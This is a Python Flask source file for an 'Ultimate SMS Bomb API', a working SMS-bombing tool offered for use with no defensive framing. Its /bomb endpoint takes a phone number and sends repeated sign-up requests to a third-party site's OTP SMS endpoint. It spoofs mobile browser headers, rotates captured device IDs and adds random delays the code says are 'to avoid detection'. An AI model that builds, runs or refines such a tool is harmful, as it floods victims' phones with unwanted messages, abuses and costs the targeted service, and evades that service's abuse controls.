from flask import Flask, request, jsonify
import requests
import threading
import time
import random

app = Flask(__name__)

# List of different device IDs from your 10 curl commands
DEVICE_IDS = [
    "AVl4a4UbUrSxqF8U",
    "mPWgSsZeGwg2OmKa", 
    "InB8JfbExPT1jX6K",
    "YCief2f1QDKNYymf"
]

def send_sms_variation(phone_number, attempt_num, variation_num):
    """
    Function to send SMS using different variations from curl commands
    """
    url = "https://fastwebhost.site/sms-sender.php"
    
    # Base headers common to all variations
    base_headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Mobile Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'application/json',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua': '"Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"',
        'sec-ch-ua-mobile': '?1',
        'x-site-id': 'acewin',
        'origin': 'https://fastwebhost.site',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://fastwebhost.site/',
        'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,hi;q=0.6',
        'priority': 'u=1, i'
    }
    
    # Use different device ID for each variation
    device_id = DEVICE_IDS[variation_num % len(DEVICE_IDS)]
    headers = base_headers.copy()
    headers['device-id'] = device_id
    
    data = {
        "phone": phone_number,
        "source": "SIGN_UP"
    }
    
    try:
        response = requests.post(
            url,
            headers=headers,
            json=data,
            timeout=10
        )
        
        print(f"Attempt {attempt_num}: Status Code - {response.status_code}")
        return {
            "attempt": attempt_num,
            "status_code": response.status_code,
            "success": response.status_code == 200
        }
    except Exception as e:
        print(f"Attempt {attempt_num}: Error - {str(e)}")
        return {
            "attempt": attempt_num,
            "error": str(e),
            "success": False
        }

@app.route('/bomb', methods=['GET'])
def bomb_sms():
    """
    API endpoint to trigger SMS bombing with multiple variations
    Usage: http://127.0.0.1:5000/bomb?num=9876543210&repeat=10
    """
    # Get parameters from query string
    phone_number = request.args.get('num')
    repeat = request.args.get('repeat', 1)
    
    # Validate parameters
    if not phone_number:
        return jsonify({"error": "Phone number is required"}), 400
    
    try:
        repeat = int(repeat)
        if repeat <= 0:
            return jsonify({"error": "Repeat count must be positive"}), 400
        if repeat > 100:  # Safety limit
            return jsonify({"error": "Repeat count too high. Maximum is 100"}), 400
    except ValueError:
        return jsonify({"error": "Repeat must be a valid number"}), 400
    
    # Start SMS bombing in a separate thread to avoid blocking
    def start_bombing():
        results = []
        for i in range(repeat):
            # Use different variation for each attempt (cycle through 4 variations)
            variation_num = i % 4
            result = send_sms_variation(phone_number, i+1, variation_num)
            results.append(result)
            
            # Random delay between requests to avoid detection (0.5 to 2 seconds)
            time.sleep(random.uniform(0.5, 2))
        
        # Print summary
        successful = sum(1 for r in results if r.get('success'))
        print(f"Bombing completed: {successful}/{repeat} successful")
    
    # Run in background thread
    thread = threading.Thread(target=start_bombing)
    thread.daemon = True
    thread.start()
    
    return jsonify({
        "message": "Bomb started successfully",
        "phone_number": phone_number,
        "repeat_count": repeat,
        "status": "running",
        "note": f"Using {len(DEVICE_IDS)} different device IDs rotating for better success rate"
    })

@app.route('/')
def home():
    return """
    <html>
        <head>
            <title>Ultimate SMS Bomb API</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }
                .container { max-width: 900px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                h1 { color: #333; border-bottom: 2px solid #007bff; padding-bottom: 10px; }
                code { background: #f8f9fa; padding: 15px; display: block; border-radius: 5px; border-left: 4px solid #007bff; margin: 10px 0; }
                .feature { background: #e7f3ff; padding: 15px; border-radius: 5px; margin: 15px 0; }
                .success { color: #28a745; font-weight: bold; }
                .stats { display: flex; justify-content: space-between; margin: 20px 0; }
                .stat-box { background: #007bff; color: white; padding: 15px; border-radius: 5px; text-align: center; flex: 1; margin: 0 5px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>💣 Ultimate SMS Bomb API</h1>
                
                <div class="stats">
                    <div class="stat-box">
                        <h3>10</h3>
                        <p>Curl Commands</p>
                    </div>
                    <div class="stat-box">
                        <h3>4</h3>
                        <p>Unique Device IDs</p>
                    </div>
                    <div class="stat-box">
                        <h3>100</h3>
                        <p>Max Requests</p>
                    </div>
                </div>
                
                <div class="feature">
                    <h2>🚀 Advanced Features:</h2>
                    <ul>
                        <li><strong>4 Different Device IDs</strong> rotating automatically</li>
                        <li><strong>Random Delays</strong> between requests (0.5-2 seconds)</li>
                        <li><strong>HTTP/2 Support</strong> included</li>
                        <li><strong>Background Processing</strong> - non blocking</li>
                        <li><strong>Smart Rotation</strong> of device IDs</li>
                        <li><strong>No Device ID in Response</strong> - Clean output</li>
                    </ul>
                </div>
                
                <h2>📡 API Usage:</h2>
                <code>GET /bomb?num=PHONE_NUMBER&repeat=COUNT</code>
                
                <p><strong>Example:</strong></p>
                <code>http://127.0.0.1:5000/bomb?num=9876543210&repeat=10</code>
                
                <p><strong>Parameters:</strong></p>
                <ul>
                    <li><strong>num</strong>: Phone number to bomb (required)</li>
                    <li><strong>repeat</strong>: Number of times to send SMS (default: 1, max: 100)</li>
                </ul>
                
                <p class="success">✅ Response: "Bomb started successfully"</p>
                
                <h2>🛡️ Device IDs Being Used (Internally):</h2>
                <ul>
                    <li>AVl4a4UbUrSxqF8U</li>
                    <li>mPWgSsZeGwg2OmKa</li>
                    <li>InB8JfbExPT1jX6K</li>
                    <li>YCief2f1QDKNYymf</li>
                </ul>
            </div>
        </body>
    </html>
    """

@app.route('/status')
def status():
    return jsonify({
        "status": "API is running",
        "version": "3.0",
        "features": [
            "10 curl commands optimized",
            "4 rotating device IDs", 
            "Random delays",
            "HTTP/2 support",
            "Background processing",
            "Clean response without device IDs"
        ],
        "max_repeat": 100
    })

if __name__ == '__main__':
    print("💣 Ultimate SMS Bomb API Starting...")
    print(f"🆔 Using {len(DEVICE_IDS)} unique device IDs from 10 curl commands")
    print("🌐 Server running on: http://127.0.0.1:5000")
    print("📝 Access: http://127.0.0.1:5000/")
    print("💣 Bomb API: http://127.0.0.1:5000/bomb?num=9876543210&repeat=10")
    print("✅ Device IDs hidden from API response")
    app.run(debug=True, host='127.0.0.1', port=5000)